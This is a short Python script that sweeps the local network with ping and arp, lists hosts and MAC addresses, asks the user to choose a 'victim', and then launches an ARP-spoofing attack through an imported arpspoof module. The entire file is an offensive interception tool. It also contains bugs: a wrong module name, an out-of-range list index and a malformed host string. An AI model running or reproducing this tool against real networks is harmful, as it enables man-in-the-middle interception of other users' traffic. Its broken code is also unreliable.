#coding
import platform
import subprocess as sp
import socket
import time
from arpspoof import arpspoof
from colorama import Fore, Back, Style
class scan:
    def __init__(self,time):
        self.time=time
    def make(self):
        hostname = socket.gethostname()    
        IP= socket.gethostbyname(hostname)
        IP=IP.replace(".","/",2) 
        IP=IP.replace("/",".",1)
        IP=IP.split('/')[0]
        print(Fore.BLUE+"Ctrl+c to stop scan")
        try:
         for i in range(0,254):
          for a in range(0,254):
           status,result = sp.getstatusoutput("ping -c1 -w2 " + str(IP)+"."+str(i)+"."+str(a))
           if status == 0:
              print(Fore.GREEN+"A machine was found :" + str(IP)+"."+str(i)+"."+str(a))
              print (Fore.GREEN+"Machine name ="+socket.getfqdn(str(IP)+str(i)+"."+str(a)))
              print(Fore.GREEN+"-------------")
              cmd = 'arp -a '+str(IP)+'.'+str(i)+'.'+str(a)
              returned_output = subprocess.check_output((cmd),shell=True,stderr=subprocess.STDOUT)
              output=returned_output.decode()
              output=output.split('[')[0]
              output=output.split("at", 1)[-1]
              print(Fore.GREEN+"His Mac address is"+output)
              continue
           else:
              continue
        except KeyboardInterrupt:
            print(Fore.GREEN+"\n Scan has finished")      
        present_input=["Choose the box's ip address:","Choose the victim's mac adress:"]
        response_input=[]
        for i in range(0,2):
            response=input(present_input[i])
            response_input.append(response)
        print(socket.gethostbyname(hostname))
        time.sleep(7)
        attack=arpspoof(response_input[1],socket.gethostbyname(hostname),response_input[2],self.time)
        attack.make()
            
